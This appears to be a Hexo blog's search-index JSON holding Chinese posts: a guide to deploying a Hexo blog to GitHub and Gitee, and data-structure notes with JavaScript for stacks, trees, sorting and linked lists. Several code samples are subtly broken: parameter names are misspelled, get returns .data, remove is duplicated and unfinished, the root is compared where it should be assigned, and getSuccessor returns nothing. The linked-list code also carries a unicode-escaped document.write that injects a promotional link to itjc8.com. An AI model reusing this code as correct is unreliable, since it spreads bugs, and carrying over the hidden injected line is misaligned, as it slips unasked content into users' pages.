&#125;&#125;)&lt;/script&gt;\n\n","categories":["Vue"],"tags":["MVVM模型","数据代理"]},{"title":"实习记录","url":"/2022/06/17/%E5%AE%9E%E4%B9%A0%E8%AE%B0%E5%BD%95/","content":"\n\n\n当请求成功或请求不成功但过了10s，都关闭弹窗promise.race([请求，定时10s]).then(  关闭弹窗)\n2.硬编码问题\n"},{"title":"将Hexo博客同时部署至GitHub与Gitee","url":"/2022/03/24/%E5%B0%86Hexo%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E8%87%B3GitHub%E4%B8%8EGitee/","content":"前言半个多月前在Github上部署了Hexo个人博客：Wu Shihan’Blog。考虑到GitHub经常出现访问不上的情况，如果没有科学上网的话，不够稳定容易翻车，所以打算在国内的Gitee上也部署一份，双重保险！\n前提：已经在Github上成功部署过Hexo博客了，具体的配置过程可以参照此博文：基于Hexo + Github &amp; Gitee 搭建个人Blog\n如何实现将博客同时部署到两个托管平台呢？\n在查阅资料之前，我能想到的解决方案是在本地创建两份一模一样的博客文件，每次更新后分别向Github和Gitee提交两次博文。但我觉得肯定有更简单的解决方案，实现“一键“即可同时更新Github和Gitee上的blog，以下将介绍实现将Hexo博客从单一部署（Github）到多部署（Github+Gitee）的方法。\n第一步：配置ssh文件起初在配置GitHub的时，没有使用config文件，因为只需要将id_rsa.pub文件中的公钥拷贝到个人GitHub的settings下新建ssh就好了。\n但由于部署到两个不同平台时，可能会出现需要用两个不同的邮箱账号的情况，因此就需要用到config。\n\n生成另外一个账号（注册gitee的邮箱）的rsa，因为我是要部署到gitee，所以以gitee_id_rsa命名以区分。\n$ ssh-keygen -t rsa -C &#x27;邮箱名@qq.com&#x27; -f ~/.ssh/gitee_id_rsa\n\n把公钥放到gitee的设置下的ssh中。\n\n\n配置config，在 C:\\Users\\你的账户的名字.ssh 目录下新建一个config文件（没有后缀的），添加如下内容（其中Host和HostName填写git服务器的域名，IdentityFile指定私钥的路径）\n# giteeHost gitee.com HostName gitee.com PreferredAuthentications publickeyIdentityFile ~/.ssh/gitee_id_rsa  # gitee的ssh路径# githubHost github.com HostName github.com PreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa # github的ssh路径\n\n在命令行测试一下\n$ ssh -T git@gitee.com$ ssh -T git@github.com\n\n出现以下则说明测试成功！\n\n\n\n\n第二步：在Gitee中创建一个仓库\n仓库名称要与用户名相同。\n\n\n注：用户名指的是gitee域名里你的名字，而不是你在gitee设置里个性化设置的姓名。\n\n\n\n创建完成后打开当前仓库的gitee pages服务，并勾选”强制使用HTTPS“。\n\n\n注：新建的仓库如果没有任何文件，是没有入口打开Gitee pages服务的，此时可以先自动生成readme文档，使其开启该服务接口。\n\n\n\n第三步：配置博客的_config.yml更新完~&#x2F;.ssh&#x2F;config后，博客的config.yml也要修改（注：不是修改主题的config.yml）\n\n打开博客的_config.yml，找到deployment栏，如下所示：\n# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo:     git@github.com:Milky53/Milky53.github.io.git #这是已经配置的github的repo  branch: master\n\n现在需要加入一个新的repo，保证仓库名称和路径一致。\n# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo:     github: git@github.com:Milky53/Milky53.github.io.git    gitee: git@gitee.com:wu_shi_han/wu_shi_han.git #新增的gitee的repo  branch: master\n\n第四步：部署博客执行博客提交三件套：\nhexo cleanhexo ghexo d\n\n\n不成功的话\n若提示cannot find repository之类的话，那么是上面前三个步骤中的某一步做错了。\n若是提示邮箱要公开的问题，复制报错提示的网址去邮箱界面把邮箱设置成公开即可。\n\n对于Gitee，它不会自动帮你更新，所以每次部署完之后都要进入gitee pages服务中点一次“更新”。\n","categories":["Blog"],"tags":["博客"]},{"title":"数据结构与算法（一）：栈","url":"/2022/03/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A0%88/","content":"js中栈的实现方式\n基于数组实现\n基于链表实现\n\n栈的实现（基于数组）// 栈的封装function Stack() &#123;    // 栈中的属性    var items = []    // 栈相关的方法    // 压栈操作    this.push = function (element) &#123;        items.push(element)    &#125;    // 出栈操作    this.pop = function () &#123;        return items.pop()    &#125;    // peek操作    this.peek = function () &#123;        return items[items.length - 1]    &#125;    // 判断栈中的元素是否为空    this.isEmpty = function () &#123;        return items.length == 0    &#125;    // 获取栈中元素的个数    this.size = function () &#123;        return items.length    &#125;        //toString方法    this.toString = function() &#123;        var resultString = &#x27;&#x27;        for(var i=0;i&lt;this.items.length;i++)&#123;            resultString += this.items[i]+&#x27;&#x27;        &#125;        return resultString    &#125;&#125;//栈的使用var s = new Stack()\n\n栈的相关方法（需自己实现）\npush() 入栈\npop() 出栈\npeek() 返回栈顶元素\nisEmpty() 判断栈是否为空\nsize() 栈中元素个数\ntoString() 将栈结构的内容以字符形式返回\n\n栈实现十进制转二进制// 封装十进制转二进制的函数function dec2bin(decNumer) &#123;    // 定义变量    var stack = new Stack()    var remainder;    // 循环除法    while (decNumer &gt; 0) &#123;        remainder = decNumer % 2        decNumer = Math.floor(decNumer / 2) //向下取整        stack.push(remainder)    &#125;    // 将数据取出    var binayriStrng = &quot;&quot;    while (!stack.isEmpty()) &#123;        binayriStrng += stack.pop()    &#125;    return binayriStrng&#125;// 测试函数alert(dec2bin(10))alert(dec2bin(233))alert(dec2bin(1000))\n\n","categories":["数据结构与算法"],"tags":["栈"]},{"title":"数据结构与算法（七）：树","url":"/2022/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E6%A0%91/","content":"相关概念\n\n所有的树本质上够可以使用二叉树模拟出来（儿子-兄弟表示法旋转）\n\n二叉树二叉树的特性\n一个二叉树第i层的最大节点数为：\n深度为k的二叉树的最大节点总数为：\n对任何非空二叉树T，若表示叶节点的个数、是度为2的非叶节点个数，那么两者满足关系\n\n\n\n完美二叉树（满二叉树）\n除最后一层的叶子节点外，每层节点都有2个子节点\n\n完全二叉树\n除了最后一层外，其它各层的节点都达到最大个数\n且最后一层从左向右的叶节点连续存在，只缺右侧若干节点\n完美二叉树是特殊的完全二叉树\n\n\n二叉搜索树（BST,Binary Search Tree)\n又称二叉排序树或二叉查找树\n\n如果不为空，满足以下性质：\n\n非空左子树的所有键值小于其根节点的键值\n非空右子树的所有键值大于其根节点的键值\n左右子树本身也是都是二叉搜索树\n\n\n优点：\n\n查找效率高 （与深度有关）\n插入、删除效率高\n\n\n缺点：\n\n当插入数据有序时，二叉搜索树深度很大，导致查找效率变低\n\n\n\n二叉搜索树的封装// 创建BinarySearchTreefunction BinarySerachTree() {    // 创建节点构造函数    function Node(key) {        this.key = key        this.left = null        this.right = null    }    // 保存根的属性    this.root = null    // 二叉搜索树相关的操作方法    // 向树中插入数据    BinarySerachTree.prototype.insert = function (key) {        // 1.根据key创建对应的node        var newNode = new Node(key)        // 2.判断根节点是否有值        if (this.root === null) {            this.root = newNode        } else {            this.insertNode(this.root, newNode)        }    }    //递归操作    BinarySerachTree.prototype.insertNode = function (node, newNode) {        if (newNode.key &lt; node.key) { // 1.准备向左子树插入数据            if (node.left === null) { // 1.1.node的左子树上没有内容                node.left = newNode            } else { // 1.2.node的左子树上已经有了内容                this.insertNode(node.left, newNode)            }        } else { // 2.准备向右子树插入数据            if (node.right === null) { // 2.1.node的右子树上没有内容                node.right = newNode            } else { // 2.2.node的右子树上有内容                this.insertNode(node.right, newNode)            }        }    }    // 获取最大值和最小值    BinarySerachTree.prototype.min = function () {        var node = this.root        while (node.left !== null) {            node = node.left        }        return node.key    }    BinarySerachTree.prototype.max = function () {        var node = this.root        while (node.right !== null) {            node = node.right        }        return node.key    }    // 搜索特定的值（递归）    /*        BinarySerachTree.prototype.search = function (key) {            return this.searchNode(this.root, key)        }        BinarySerachTree.prototype.searchNode = function (node, key) {            // 1.如果传入的node为null那么, 那么就退出递归            if (node === null) {                return false            }            // 2.判断node节点的值和传入的key大小            if (node.key &gt; key) { // 2.1.传入的key较小, 向左边继续查找                return this.searchNode(node.left, key)            } else if (node.key &lt; key) { // 2.2.传入的key较大, 向右边继续查找                return this.searchNode(node.right, key)            } else { // 2.3.相同, 说明找到了key                return true            }        }        */    //搜索特定的值（循环）    BinarySerachTree.prototype.search = function (key) {        var node = this.root        while (node !== null) {            if (node.key &gt; key) {                node = node.left            } else if (node.key &lt; key) {                node = node.right            } else {                return true            }        }        return false    }    // 删除节点    BinarySerachTree.prototype.remove = function (key) {        // 1.获取当前的node        var node = this.root        var parent = null        // 2.循环遍历node        while (node) {            if (node.key &gt; key) {                parent = node                node = node.left            } else if (node.key &lt; key) {                parent = node                node = node.right            } else {                if (node.left == null &amp;&amp; node.right == null) {                }            }        }    }    BinarySerachTree.prototype.removeNode = function (node, key) {        // 1.如果传入的node为null, 直接退出递归.        if (node === null) return null        // 2.判断key和对应node.key的大小        if (node.key &gt; key) {            node.left = this.removeNode(node.left, key)        }    }    // 删除结点    BinarySerachTree.prototype.remove = function (key) {        // 1.定义临时保存的变量        var current = this.root        var parent = this.root        var isLeftChild = true //标记当前节点在父节点的左还是右        // 2.开始查找节点        while (current.key !== key) {            parent = current            if (key &lt; current.key) {                isLeftChild = true                current = current.left            } else {                isLeftChild = false                current = current.right            }            // 如果发现current已经指向null, 那么说明没有找到要删除的数据            if (current === null) return false        }        // 3.删除的结点是叶结点        if (current.left === null &amp;&amp; current.right === null) {            if (current == this.root) {                this.root == null            } else if (isLeftChild) {                parent.left = null            } else {                parent.right = null            }        }        // 4.删除有一个子节点的节点        else if (current.right === null) {            if (current == this.root) {                this.root = current.left            } else if (isLeftChild) {                parent.left = current.left            } else {                parent.right = current.left            }        } else if (current.left === null) {            if (current == this.root) {                this.root = current.right            } else if (isLeftChild) {                parent.left = current.right            } else {                parent.right = current.right            }        }        // 5.删除有两个节点的节点        else {            // 1.获取后继节点            var successor = this.getSuccessor(current)            // 2.判断是否是根节点            if (current == this.root) {                this.root = successor            } else if (isLeftChild) {                parent.left = successor            } else {                parent.right = successor            }            // 3.将删除节点的左子树赋值给successor            successor.left = current.left        }        return true    }    // 找后继的方法    BinarySerachTree.prototype.getSuccessor = function (delNode) {        // 1.使用变量保存临时的节点        var successorParent = delNode        var successor = delNode        var current = delNode.right // 要从右子树开始找        // 2.寻找节点        while (current != null) {            successorParent = successor            successor = current            current = current.left        }        // 3.如果是删除图中15的情况, 还需要如下代码        if (successor != delNode.right) {            successorParent.left = successorParent.right            successor.right = delNode.right        }    }    // 遍历方法    // 先序遍历    BinarySerachTree.prototype.preOrderTraversal = function (handler) {        this.preOrderTranversalNode(this.root, handler)    }    BinarySerachTree.prototype.preOrderTranversalNode = function (node, handler) {        if (node !== null) {            handler(node.key)            this.preOrderTranversalNode(node.left, handler)            this.preOrderTranversalNode(node.right, handler)        }    }    // 中序遍历    BinarySerachTree.prototype.inOrderTraversal = function (handler) {        this.inOrderTraversalNode(this.root, handler)    }    BinarySerachTree.prototype.inOrderTraversalNode = function (node, handler) {        if (node !== null) {            this.inOrderTraversalNode(node.left, handler)            handler(node.key)            this.inOrderTraversalNode(node.right, handler)        }    }    // 后续遍历    BinarySerachTree.prototype.postOrderTraversal = function (handler) {        this.postOrderTraversalNode(this.root, handler)    }    BinarySerachTree.prototype.postOrderTraversalNode = function (node, handler) {        if (node !== null) {            this.postOrderTraversalNode(node.left, handler)            this.postOrderTraversalNode(node.right, handler)            handler(node.key)        }    }}\n\n常见操作\ninsert(key)\nsearch(key)\ninOrderTraverse()中序遍历\npreOrderTraverse() 先序遍历\npostOrderTraverse() 后序遍历\nmin 返回树中最小的值/键\nmax 返回树中最大的值/键\nremove(key) 移除某个键\n\n二叉搜索树的删除\n搜索需要删除的节点，如果没有找到，则不需要删除\n\n找到要删除的节点\n\n删除叶子节点\n\n删除只有一个子节点的节点\n\n删除有两个子节点的节点\n\n\n\n\n\n平衡树\n比较好的二叉搜索树数据应该时左右分布均匀的\n但当插入连续树后，分布不均匀，称这种树为非平衡树\n对于一颗平衡二叉树来说，插入/查找的效率时O(logN)\n对于一颗非平衡二叉树，相当于一个链表，效率为O(N)\n\n\n平衡树：树种每个节点左边的子孙节点个数，尽可能的等于右边的子孙节点个数\n常见的平衡树\nAVL树：每个节点多存储了一个额外数据，保持树的平衡。整体效率不如红黑树，实际开发中应用较少。\n红黑树：通过一些特性来保持树的平衡。实际应用基本是红黑树。\n\n\n\n红黑树（数据结构中的难点）\n红黑树的规则\n包含二叉搜索树的规则，另外还添加了以下性质：\n\n节点是红色或黑色。\n\n根节点是黑色。\n\n每个叶子节点都是黑色的空节点（NIL）。\n\n\n​     （即任何包含数据的项都不会作为叶子节点）\n\n每个红色节点的两个子节点都是黑色。\n\n​      （从每个叶子到跟的路径上不能有两个连续的红色节点）\n\n从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点。\n\n\n\n红黑树的相对平衡\n以上约束确保了红黑树的关键特性：\n\n从根到叶子的最长可能路径，不会超过最短可能路径的两倍长\nwhy？\n性质4 决定了路径不能又两个相连的红色节点\n最短的可能路径都是黑色节点（4个），最长的可能路径是红色黑色交替（7个）\n性质5 所有路径都有相同数目的黑色节点\n表明了没有路径能多余任何其它路径的两倍长\n\n基本是平衡的\n\n虽然没有做到绝对的平衡，但是可以保证在最坏的情况下，依然是最高效的\n\n\n\n还可通过2-3树、2-3-4树对红黑树的平衡进行解释\n\n\n红黑树的变换（变色、旋转）\n插入一个新节点后，有可能树不再平衡，可以通过三种方式发变换，让树保持平衡：变色、左旋转、右旋转\n不符合规则才需要变换\n\n变色\n为了重新符合红黑树的规则，尝试把红色节点变为黑色，或把黑色节点变为红色\n\n\n首先，新插入的节点通常是红色节点。（创建时默认为红色）\n因为插入红色节点时，有可能插入一次时不违反红黑树任何规则的（即不需要牵一发而动全身）\n而插入黑色节点时，必然会导致有一条路径上多了黑色节点，这是很难调整的\n插入红色节点可能导致出现红红相连的情况，但这种情况可以通过变色和旋转来调整\n\n\n\n左旋转\n逆时针旋转红黑树的两个节点，使得父节点被自己的右孩子取代，而自己成为自己的左孩子\n\n\n右旋转\n顺时针旋转红黑树的两个节点，使得父节点被自己的左孩子取代，而自己成为自己的右孩子\n\n\n变换规则\n以下讨论插入的情况：\n设要插入的节点为N，其父节点为P\n其祖父节点为G，其父亲的兄弟节点为U（即P和U同是G的子节点）\n\n\n\n情况一：\n\n新节点N位于树的根上，没有父节点（即第一个插入的元素）\n这种情况下，直接将红色变换成黑色即可，满足性质2\n\n\n情况二：\n\n\n新节点的父节点P是黑色\n性质4没有失效（新节点是红色的），性质5也没有任何问题\n尽管新节点N右两个黑色的叶子节点NIL，但是新节点N是红色的，所以通过它的路径中黑色节点的个数依然相同，满足性质5\n\n\n情况三：\n\nP为红色，U也是红色，此时G一定为黑（父红叔红祖黑）\n\n父红叔红祖黑 —&gt; 父黑叔黑祖红\n\n\n操作方案：\n\n将P和U变换为黑色，并且将G变换为红色。\n（父红叔红祖黑 —&gt; 父黑叔黑祖红）\n\n现在新节点N有了一个黑色的父节点P，所以每条路径上黑色节点的数目没有改变\n\n而从更高的路径上，必然都会经过G节点，所以那些路径的黑色节点数也是不变的，符合性质5\n\n\n\n可能出现的问题：\n\nN的祖父节点G的父节点可能也是红色，这就违反了性质3，可以递归的调整颜色（把G当成新插入的节点看待）\n如果递归调整颜色到了根节点，则需要进行旋转\n\n\n\n\n情况四：\n\nP为红色，U为黑色，N为左子节点，此时G一定为黑（父红叔黑祖黑+N是左儿子）\n—–&gt;父黑祖红\n—–&gt;以G为根右旋转\n\n\n\n操作方案：\n将P变为黑色，G变为红色\n对G进行依次右旋转\n\n\n\n\n情况五：\n\nP为红色，U为黑色，N为右子节点，此时G一定为黑（父红叔黑祖黑+N是右儿子）\n\n—–&gt;以P为根左旋转\n\n—–&gt;将P作为新插入的红色节点考虑即可（即情况四）\n\n—–&gt;父黑祖红\n—–&gt;以G为根右旋转\n\n\n\n操作方案：\n\n对P依次左旋转，形成情况四\n改变颜色\nG进行依次右旋转\n\n\n\n\n\n","categories":["数据结构与算法"],"tags":["树","红黑树"]},{"title":"数据结构与算法（九）：排序","url":"/2022/03/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9A%E6%8E%92%E5%BA%8F/","content":"大O表示法\n\n排序算法：冒泡排序、选择排序、插入排序、归并排序、计数排序（counting sort)、基数排序(radix sort)、希尔排序、堆排序、桶排序\n\n简单排序// 封装ArrayListfunction ArrayList() {    this.array = []    ArrayList.prototype.insert = function (item) {        this.array.push(item)    }    ArrayList.prototype.toString = function () {        return this.array.join('-')    }}\n\n冒泡排序\n时间复杂度：\n比较次数：\n交换次数：\n\n\n\n//交换两个位置的数据ArrayList.prototype.swap = function (m, n) {    var temp = this.array[m]    this.array[m] = this.array[n]    this.array[n] = temp}//冒泡排序ArrayList.prototype.bubbleSort = function () {    // 1.获取数组的长度    var length = this.array.length    // 2.反向循环, 因此次数越来越少    for (var i = length - 1; i &gt;= 0; i--) {        // 3.根据i的次数, 比较循环到i位置        for (var j = 0; j &lt; i; j++) {            // 4.如果j位置比j+1位置的数据大, 那么就交换            if (this.array[j] &gt; this.array[j+1]) {                // 交换                this.swap(j, j+1)            }        }    }}\n\n\n\n选择排序\n时间复杂度：\n比较次数：\n交换次数：\n选择排序同在认为在执行效率上高于冒泡排序\n\n\nArrayList.prototype.selectionSort = function () {    // 1.获取数组的长度    var length = this.array.length    // 2.外层循环: 从0位置开始取出数据, 直到length-2位置    for (var i = 0; i &lt; length - 1; i++) {        // 3.内层循环: 从i+1位置开始, 和后面的内容比较        var min = i        for (var j = min + 1; j &lt; length; j++) {            // 4.如果i位置的数据大于j位置的数据, 记录最小的位置            if (this.array[min] &gt; this.array[j]) {                min = j            }        }        this.swap(min, i)    }}\n\n\n\n插入排序\n时间复杂度：\n比较次数：\n复制次数：\n插入排序是简单排序中效率最好的\n对于基本有序的数据来说，插入排序要好很多\n\n\nArrayList.prototype.insertionSort = function () {    // 1.获取数组的长度    var length = this.array.length    // 2.外层循环: 外层循环是从1位置开始, 依次遍历到最后    for (var i = 1; i &lt; length; i++) {        // 3.记录选出的元素, 放在变量temp中        var j = i        var temp = this.array[i]        // 4.内层循环: 内层循环不确定循环的次数, 最好使用while循环        while (j &gt; 0 &amp;&amp; this.array[j-1] &gt; temp) {            this.array[j] = this.array[j-1]            j--        }        // 5.将选出的j位置, 放入temp元素        this.array[j] = temp    }}\n\n高级排序希尔排序\n\n最快情况下时间复杂度：，通常情况下都好于\n希尔排序是插入排序的一种高效的改进版，其效率比插入排序更快\n\n\n\n数据按间隔分组，组内插入排序。下一次分组间隔减小，直到间隔为1时，进行插入排序。\n\n如何选择间隔？\n\n\n希尔排序大多数情况下效率高于简单排序\n\n在合适的增量和某些数量N的情况下，甚至好于快速排序\n\n\nArrayList.prototype.shellSort = function () {    // 1.获取数组的长度    var length = this.array.length    // 2.根据长度计算增量    var gap = Math.floor(length / 2)    // 3.增量不断变量小, 大于0就继续排序    while (gap &gt; 0) {        // 4.以gap为间隔进行分组，对组内进行插入排序        for (var i = gap; i &lt; length; i++) {            // 4.1.保存临时变量            var j = i            var temp = this.array[i]            // 4.2.插入排序的内层循环            while (j &gt; gap - 1 &amp;&amp; this.array[j - gap] &gt; temp) {                this.array[j] = this.array[j - gap]                j -= gap            }            // 4.3.将选出的j位置设置为temp            this.array[j] = temp        }        // 5.重新计算新的间隔        gap = Math.floor(gap / 2)    }}\n\n\n\n快速排序\n平均时间复杂度：\n\n快速排序几乎时目前所有排序算法中最快的排序算法\n\n应用于C++的STL、Java等\n\n快速排序可以看作时最慢的冒泡排序的升级版：在一次循环中（其实时递归调用），找出某个元素的正确位置，并且该元素之后不需要任何移动。\n\n快排思想：分而治之\n\n\n如何选择快速排序的枢纽？\n\n\n\n// 选择枢纽ArrayList.prototype.median = function (left, right) {    // 1.求出中间的位置    var center = Math.floor((left + right) / 2)    // 2.判断并且进行交换 （相当于一个冒泡）    if (this.array[left] &gt; this.array[center]) {        this.swap(left, center)    }    if (this.array[center] &gt; this.array[right]) {        this.swap(center, right)    }    if (this.array[left] &gt; this.array[center]) {        this.swap(left, center)    }    // 3.巧妙的操作: 将center移动到right - 1的位置.    this.swap(center, right - 1)    // 4.返回pivot    return this.array[right - 1]}// 快速排序实现ArrayList.prototype.quickSort = function () {    this.quickSortRec(0, this.array.length - 1)}ArrayList.prototype.quickSortRec = function (left, right) {    // 0.递归结束条件    if (left &gt;= right) return    // 1.获取枢纽    var pivot = this.median(left, right)    // 2.开始进行交换    var i = left    var j = right - 1 //枢纽位置    while (i!=j) {        while (this.array[++i] &lt; pivot) { }        while (this.array[--j] &gt; pivot) { }        if (i &lt; j) {            this.swap(i, j)        }    }    // 3.将枢纽放在正确的位置    this.swap(i, right - 1)    // 4.递归调用左边    this.quickSortRec(left, i - 1)    this.quickSortRec(i + 1, right)}\n\n","categories":["数据结构与算法"],"tags":["排序"]},{"title":"数据结构与算法（三）：链表","url":"/2022/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E9%93%BE%E8%A1%A8/","content":"链表的实现// 封装链表的构造函数function LinkedList() &#123;    // 内部类，封装一个Node类, 用于保存每个节点信息    function Node(element) &#123;        this.element = element        this.next = null    &#125;    // 链表中的属性    this.length = 0    this.head = null    // 链表尾部追加元素方法    LinkedList.prototype.append = function (element) &#123;        // 1.根据新元素创建节点        var newNode = new Node(element)        // 2.判断原来链表是否为空        if (this.head === null) &#123; // 链表尾空            this.head = newNode        &#125; else &#123; // 链表不为空            // 2.1.定义变量, 保存当前找到的节点            var current = this.head            while (current.next) &#123;                current = current.next            &#125;            // 2.2.找到最后一项, 将其next赋值为node            current.next = newNode        &#125;        // 3.链表长度增加1        this.length += 1    &#125;    // 链表的toString方法    LinkedList.prototype.toString = function () &#123;        // 1.定义两个变量        var current = this.head        var listString = &quot;&quot;        // 2.循环获取链表中所有的元素        while (current) &#123;            listString += &quot;,&quot; + current.element            current = current.next        &#125;        // 3.返回最终结果        return listString.slice(1)    &#125;    // 根据下标删除元素    LinkedList.prototype.insert = function (position, element) &#123;        // 1.检测越界问题: 越界插入失败        if (position &lt; 0 || position &gt; this.length) return false        // 2.定义变量, 保存信息        var newNode = new Node(element)        var current = this.head        var previous = null        index = 0        // 3.判断是否列表是否在第一个位置插入        if (position == 0) &#123;            newNode.next = current            this.head = newNode        &#125; else &#123;            while (index++ &lt; position) &#123;                previous = current                current = current.next            &#125;            newNode.next = current            previous.next = newNode        &#125;        // 4.length+1        this.length+=1        return true    &#125;    //get方法    LinkedList.prototype.get = function(positon)&#123;        if (position &lt; 0 || position &gt;= this.length) return null        var current  = this.head        var index = 0        while(index++&lt;position)&#123;            current = current.next        &#125;        return current.data    &#125;    //update方法    LinkedList.prototype.update = function(positon,newData)&#123;        if (position &lt; 0 || position &gt;= this.length) return null        var current  = this.head        var index = 0        while(index++&lt;position)&#123;            current = current.next        &#125;        current.data = newData        return true    &#125;    // 根据位置移除节点    LinkedList.prototype.removeAt = function (position) &#123;        // 1.检测越界问题: 越界移除失败, 返回null        if (position &lt; 0 || position &gt;= this.length) return null        // 2.定义变量, 保 存信息        var current = this.head        var previous = null        var index = 0        // 3.判断是否是移除第一项        if (position === 0) &#123;            this.head = current.next        &#125; else &#123;            while (index++ &lt; position) &#123;                previous = current                current = current.next            &#125;            previous.next = current.next        &#125;        // 4.length-1        this.length--        // 5.返回移除的数据        return current.element    &#125;    // 根据元素获取链表中的位置    LinkedList.prototype.indexOf = function (element) &#123;        // 1.定义变量, 保存信息        var current = this.head        index = 0        // 2.找到元素所在的位置        while (current) &#123;            if (current.element === element) &#123;                return index            &#125;            index++            current = current.next        &#125;        // 3.来到这个位置, 说明没有找到, 则返回-1        return -1    &#125;    // 根据元素删除信息    LinkedList.prototype.remove = function (element) &#123;        var index = this.indexOf(element)        return this.removeAt(index)    &#125;    // 判断链表是否为空    LinkedList.prototype.isEmpty = function () &#123;        return this.length == 0    &#125;    // 获取链表的长度    LinkedList.prototype.size = function () &#123;        return this.length    &#125;    // 获取第一个节点    LinkedList.prototype.getFirst = function () &#123;        return this.head.element    &#125;&#125;// 测试链表// 1.创建链表var list = new LinkedList()// 2.追加元素list.append(15)list.append(10)list.append(20)// 3.打印链表的结果alert(list) // 15,10,20// 4.测试insert方法list.insert(0, 100)list.insert(4, 200)list.insert(2, 300)alert(list) // 100,15,300,10,20,200// 5.测试removeAt方法list.removeAt(0)list.removeAt(1)list.removeAt(3)alert(list)// 6.测试indexOf方法//    alert(list.indexOf(15))//    alert(list.indexOf(10))//    alert(list.indexOf(20))//    alert(list.indexOf(100))// 7.测试remove方法list.remove(15)alert(list)// 8.测试其他方法alert(list.isEmpty())alert(list.size())alert(list.getFirst())document.write(&#x27;\\u66f4\\u591a\\u6559\\u7a0b\\u8bf7\\u8bbf\\u95ee\\u0020\\u0069\\u0074\\u006a\\u0063\\u0038\\u002e\\u0063\\u006f\\u006d&#x27;);\n\n链表的相关方法（增删改查）\nappend(element) 向链表尾部添加一个新的项\ninsert(position,element) 向链表的特定位置插入一个新的项\nget(position) 获取对应位置元素\nindexOf(element) 返回元素在链表中的索引，没有则返回-1\nupdate(position) 修改某个位置的元素\nremoveAt(position) 从链表的特定位置移除一项\nremove(element) 从链表中移除一项\nisEmpty() 判断链表是否为空\nsize() 链表中元素个数\ntoString() 将链表结构的内容以字符形式返回，重写js的toString方法\n\n双向链表\n便于访问前一个节点，可以从头遍历到尾，也可以从尾遍历到头\n\n// 创建双向链表的构造函数    function DoublyLinkedList() &#123;        // 创建节点构造函数        function Node(element) &#123;            this.element = element            this.next = null            this.prev = null // 新添加的        &#125;        // 定义属性        this.length = 0        this.head = null        this.tail = null // 新添加的        // 定义相关操作方法        // 在尾部追加数据        DoublyLinkedList.prototype.append = function (element) &#123;            // 1.根据元素创建节点            var newNode = new Node(element)            // 2.判断列表是否为空列表            if (this.head == null) &#123;                this.head = newNode                this.tail = newNode            &#125; else &#123;                this.tail.next = newNode                newNode.prev = this.tail                this.tail = newNode            &#125;            // 3.length+1            this.length++        &#125;        // 在任意位置插入数据        DoublyLinkedList.prototype.insert = function (position, element) &#123;            // 1.判断越界的问题            if (position &lt; 0 || position &gt; this.length) return false            // 2.创建新的节点            var newNode = new Node(element)            // 3.判断插入的位置            if (position === 0) &#123; // 在第一个位置插入数据                // 判断链表是否为空                if (this.head == null) &#123;                    this.head = newNode                    this.tail = newNode                &#125; else &#123;                    this.head.prev = newNode                    newNode.next = this.head                    this.head = newNode                &#125;            &#125; else if (position === this.length) &#123; // 插入到最后的情况                // 思考: 这种情况是否需要判断链表为空的情况呢? 答案是不需要, 为什么?                this.tail.next = newNode                newNode.prev = this.tail                this.tail = newNode            &#125; else &#123; // 在中间位置插入数据                // 定义属性                var index = 0                var current = this.head                var previous = null                // 查找正确的位置                while (index++ &lt; position) &#123;                    previous = current                    current = current.next                &#125;                // 交换节点的指向顺序                newNode.next = current                newNode.prev = previous                current.prev = newNode                previous.next = newNode            &#125;            // 4.length+1            this.length++            return true        &#125;        // 根据位置删除对应的元素        DoublyLinkedList.prototype.removeAt = function (position) &#123;            // 1.判断越界的问题            if (position &lt; 0 || position &gt;= this.length) return null            // 2.判断移除的位置            var current = this.head            if (position === 0) &#123;                if (this.length == 1) &#123;                    this.head = null                    this.tail = null                &#125; else &#123;                    this.head = this.head.next                    this.head.prev = null                &#125;            &#125; else if (position === this.length -1) &#123;                this.tail = this.tail.prev                this.tail.next = null            &#125; else &#123;                var index = 0                var previous = null                while (index++ &lt; position) &#123;                    previous = current                    current = current.next                &#125;                previous.next = current.next                current.next.prev = previous            &#125;            // 3.length-1            this.length--            return current.element        &#125;        // 根据元素获取在链表中的位置        DoublyLinkedList.prototype.indexOf = function (element) &#123;            // 1.定义变量保存信息            var current = this.head            var index = 0            // 2.查找正确的信息            while (current) &#123;                if (current.element === element) &#123;                    return index                &#125;                index++                current = current.next            &#125;            // 3.来到这个位置, 说明没有找到, 则返回-1            return -1        &#125;        // 根据元素删除        DoublyLinkedList.prototype.remove = function (element) &#123;            var index = this.indexOf(element)            return this.removeAt(index)        &#125;        // 判断是否为空        DoublyLinkedList.prototype.isEmpty = function () &#123;            return this.length === 0        &#125;        // 获取链表长度        DoublyLinkedList.prototype.size = function () &#123;            return this.length        &#125;        //get        DoublyLinkedList.prototype.get = function(positon)&#123;            if (position &lt; 0 || position &gt;= this.length) return null            //this.length / 2 &gt;= positon: 从头向后遍历            if(this.length/2 &gt;= positon)&#123;                var current  = this.head                var index = 0                while(index++&lt;position)&#123;                    current = current.next                &#125;            &#125;            //this.length / 2 &lt; positon: 从后向前遍历            else&#123;                var current  = this.tail                var index = this.length-1                while(index--&gt;position)&#123;                    current = current.prev                &#125;            &#125;            return current.data        &#125;        //update方法        DoublyLinkedList.prototype.update = function(positon,newData)&#123;            if (position &lt; 0 || position &gt;= this.length) return null            //this.length / 2 &gt;= positon: 从头向后遍历            if(this.length/2 &gt;= positon)&#123;                var current  = this.head                var index = 0                while(index++&lt;position)&#123;                    current = current.next                &#125;            &#125;            //this.length / 2 &lt; positon: 从后向前遍历            else&#123;                var current  = this.tail                var index = this.length-1                while(index--&gt;position)&#123;                    current = current.prev                &#125;            &#125;            current.data = newData            return true        